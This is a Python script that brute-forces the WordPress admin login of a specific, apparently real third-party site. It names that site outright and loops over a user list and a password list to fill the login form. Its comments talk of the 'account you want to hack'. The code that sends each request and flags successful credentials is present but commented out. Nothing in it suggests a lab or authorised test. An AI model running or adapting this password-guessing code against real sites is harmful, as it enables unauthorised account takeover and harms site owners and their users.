import requests
from loginform import fill_login_form


# The link of the website
# url = input("\nEnter URL:")
url = "http://leafus.com.ua/wp-admin"

# The userfield in the form of the login
# userField = input("\nEnter the User Field:")
userField = "log"

# The passwordfield in the form
# passwordField = input("\nEnter the Password field:")
passwordField = "pwd"

# Getting list of potentials password
passwords = open('passwords.txt').readlines()
# Getting list of user to test with
users = open('users.txt').readlines()


print(f"Connecting to: {url}......\n")
# Put the target email you want to hack
#user_email = input("\nEnter EMAIL / USERNAME of the account you want to hack:")
failed_aftertry = 0
for user in users:
    for password in passwords:
        dados = {userField: user.replace('\n', ''),
                 passwordField: password.replace('\n', '')}
        print(dados)

        r = requests.get(url)
        payload = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
        # data = dict(payload)
        print(payload)
        # print(data)
        # headers = {'User-Agent': 'Mozilla/5.0'}

        # session = requests.Session()
        # resp = session.post(url, headers=headers, data=payload)
        # print(resp.content)







        
        # the session instance holds the cookie. So use it to get/post later.
        # e.g. session.get('https://example.com/profile')

        # #print data.text
        # if "404" in data.text:
        #     if failed_aftertry > 5:
        #         print("Connexion failed : Trying again ....")
        #         break
        #     else:
        #         failed_aftertry = failed_aftertry+1
        #         print("Connexion failed : 404 Not Found (Verify your link)")
        # else:
        #     # if you want to see the text result decomment this
        #     print(data.text)
        #     if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
        #         print(f"Failed to connect with:\n user: {user} and password: {password}")
        #     else:
        #         if successMessage[0] in data.text or successMessage[1] in data.text:
        #             print("\n#######################################")
        #             print(f"\nYOUPIII!! \nTheese Credentials succeed:\n> user: {user} and password: {password}")
        #             print("#######################################")
        #             break
        #         else:
        #             print(f"Trying theese parameters: user: {user} and password: {password}")

Just_to_pause_the_script = input("\n.")